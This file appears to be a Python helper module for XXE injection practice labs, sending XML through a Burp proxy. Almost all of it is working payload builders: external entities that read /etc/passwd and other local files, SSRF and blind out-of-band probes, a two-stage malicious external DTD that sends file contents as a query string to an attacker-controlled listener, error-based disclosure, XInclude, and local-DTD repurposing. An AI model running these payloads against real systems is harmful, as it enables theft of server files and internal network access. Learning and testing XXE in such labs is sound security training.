"""
utils.py — shared helpers for the XXE Injection module labs.

📝 Note: unlike Clickjacking/DOM-based, these are back to being fully
server-side, request-driven exploits — every lab here is scriptable
end-to-end with `requests`, same shape as SQLi/Auth/JWT.
"""

from proxies import BURP_PROXIES, VERIFY_SSL
import requests


def get_session():
    s = requests.Session()
    s.proxies.update(BURP_PROXIES)
    s.verify = VERIFY_SSL
    return s


def log(msg, ok=True):
    prefix = "[+]" if ok else "[-]"
    print(f"{prefix} {msg}")


def note(msg):
    """📝 Educational aside — prints a short explainer inline with exploit output."""
    print(f"📝 {msg}")


def send_xml(session, url, xml_body, headers=None):
    """POST raw XML with the right content-type — most labs expect text/xml or application/xml."""
    h = {"Content-Type": "application/xml"}
    if headers:
        h.update(headers)
    r = session.post(url, data=xml_body.encode(), headers=h)
    return r


def extract_between(text, start_marker, end_marker):
    """Quick scrape for data reflected back in a response (e.g. a stock-check value)."""
    try:
        start = text.index(start_marker) + len(start_marker)
        end = text.index(end_marker, start)
        return text[start:end]
    except ValueError:
        return None


# ---- Payload builders -------------------------------------------------

def build_basic_xxe(entity_value, element="productId", root="stockCheck", extra_fields=""):
    """
    Classic direct-retrieval XXE: define an external entity and reference it
    inside a normal-looking request body. `entity_value` is the SYSTEM URI
    (e.g. file:///etc/passwd or http://OOB-HOST/).
    """
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE {root} [ <!ENTITY xxe SYSTEM "{entity_value}"> ]>
<{root}><{element}>&xxe;</{element}>{extra_fields}</{root}>"""


def build_ssrf_xxe(internal_url, element="productId", root="stockCheck"):
    """Same shape as build_basic_xxe, just semantically an SSRF (http:// target, not file://)."""
    return build_basic_xxe(internal_url, element=element, root=root)


def build_oob_entity_xxe(collaborator_url, element="productId", root="stockCheck"):
    """Blind XXE: no reflection, just confirm the parser reaches out to our OOB listener."""
    return build_basic_xxe(collaborator_url, element=element, root=root)


def build_parameter_entity_oob(collaborator_url):
    """
    Blind XXE via a parameter entity (%xxe;) instead of a general entity —
    needed when the app strips/rejects normal entity references but still
    processes the DTD's parameter entities.
    """
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "{collaborator_url}"> %xxe; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>"""


def build_malicious_external_dtd_file(exfil_param_name, collaborator_url):
    """
    This is what gets hosted at e.g. /exploit.dtd on the exploit server for
    the two-stage "exfiltrate via malicious external DTD" attack: it reads a
    local file, then sends it onward as a query string to our OOB listener.
    """
    return f"""<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{collaborator_url}/?{exfil_param_name}=%file;'>">
%eval;
%exfil;"""


def build_malicious_dtd_trigger(dtd_url):
    """The initial request body that pulls in the external malicious DTD above."""
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "{dtd_url}"> %xxe; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>"""


def build_error_based_dtd_file(file_to_read):
    """
    Hosted externally too — deliberately causes a parse ERROR that reflects
    file content back in the error message itself (no OOB channel needed).
    """
    return f"""<!ENTITY % file SYSTEM "file://{file_to_read}">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;"""


def build_xinclude_payload(file_to_read, element="productId"):
    """
    When we can only inject into a single element's VALUE (no control over
    the DOCTYPE at all), XInclude lets us still pull in file content if the
    parser supports it.
    """
    return (
        f'<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
        f'<xi:include href="file://{file_to_read}" parse="text"/></foo>'
    )


def build_local_dtd_repurpose_trigger(local_dtd_path, redefined_entity, collaborator_url):
    """
    When outbound traffic is blocked (no OOB possible) but a predictable
    local DTD file exists on the server (e.g. a bundled XML-processing
    library's .dtd), repurpose one of ITS already-declared entities to carry
    our file-read payload instead of defining our own from scratch.
    """
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file://{local_dtd_path}">
  <!ENTITY % {redefined_entity} '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
  '>
  %local_dtd;
]>
<message>test</message>"""
